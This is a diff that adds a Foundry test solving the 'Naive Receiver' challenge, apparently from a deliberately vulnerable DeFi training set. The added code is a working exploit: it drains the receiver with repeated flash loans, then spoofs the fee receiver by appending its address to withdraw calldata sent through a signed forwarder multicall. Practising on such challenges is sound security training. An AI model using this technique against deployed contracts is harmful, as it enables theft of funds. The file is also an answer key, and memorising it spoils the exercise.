@@ -77,7 +77,41 @@ contract NaiveReceiverChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_naiveReceiver() public checkSolvedByPlayer {
-        
+        // Prepare calldata for multicall
+        bytes memory flashLoanEncodedCalldata =
+            abi.encodeWithSelector(pool.flashLoan.selector, address(receiver), address(weth), 0, bytes(""));
+        bytes memory withdrawFeeReceiverCalldata = bytes.concat(
+            abi.encodeWithSelector(pool.withdraw.selector, WETH_IN_POOL + WETH_IN_RECEIVER, recovery),
+            bytes20(pool.feeReceiver())
+        );
+
+        // Prepare multicalls
+        bytes[] memory multicalls = new bytes[](11);
+        for (uint8 i; i < multicalls.length; ++i) {
+            multicalls[i] = flashLoanEncodedCalldata;
+        }
+        multicalls[10] = withdrawFeeReceiverCalldata;
+        bytes memory multicallEncodedCalldata = abi.encodeWithSelector(pool.multicall.selector, multicalls);
+
+        // Set up request
+        BasicForwarder.Request memory request = BasicForwarder.Request({
+            from: player,
+            target: address(pool),
+            value: 0,
+            gas: 10_000_000,
+            nonce: forwarder.nonces(player),
+            data: multicallEncodedCalldata,
+            deadline: block.timestamp + 1
+        });
+
+        // Sign the request
+        bytes32 digest =
+            keccak256(abi.encodePacked(uint16(0x1901), forwarder.domainSeparator(), forwarder.getDataHash(request)));
+        (uint8 v, bytes32 r, bytes32 s) = vm.sign(playerPk, digest);
+        bytes memory signature = abi.encodePacked(r, s, v);
+
+        // Execute multicall
+        forwarder.execute{value: 0}(request, signature);
     }
 
     /**
